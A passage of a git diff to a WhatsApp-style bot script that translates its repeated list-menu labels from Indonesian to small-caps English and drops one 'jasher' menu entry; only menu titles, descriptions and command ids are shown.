           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -8548,186 +8494,181 @@ break
 case 'sertifikatmenu': {
   let HydroSad = `${sertifikatmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -8740,186 +8681,181 @@ break
 case 'stickermenu': {
    let HydroSad = `${stickermenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -8932,186 +8868,181 @@ break
 case 'databasemenu': {
   let HydroSad = `${databasemenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
